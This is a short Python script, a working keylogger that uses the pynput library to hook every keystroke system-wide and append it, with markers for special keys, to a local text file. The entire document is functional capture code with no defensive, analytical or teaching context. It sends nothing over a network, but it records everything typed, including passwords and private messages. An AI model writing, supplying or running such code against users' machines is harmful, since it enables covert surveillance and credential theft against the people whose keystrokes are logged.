from pynput import keyboard
# Path to the text file where keystrokes will be stored
file_path = "keystrokes.txt"

# Open the file in write mode
with open(file_path, "w") as file:
    file.write("Keylogger Started\n")

# Function to write keystrokes to the file
def write_key(key):
    try:
        with open(file_path, "a") as file:
            # Handle special keys (e.g., space, enter, backspace)
            if key == keyboard.Key.space:
                file.write(" ")
            elif key == keyboard.Key.enter:
                file.write("\n")
            elif key == keyboard.Key.backspace:
                file.write("[BACKSPACE]")
            else:
                file.write(key.char)
    except AttributeError:
        with open(file_path, "a") as file:
            file.write(f"[{key.name}]")

# Listener for keystrokes
def on_press(key):
    write_key(key)

# Start listening for keystrokes
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
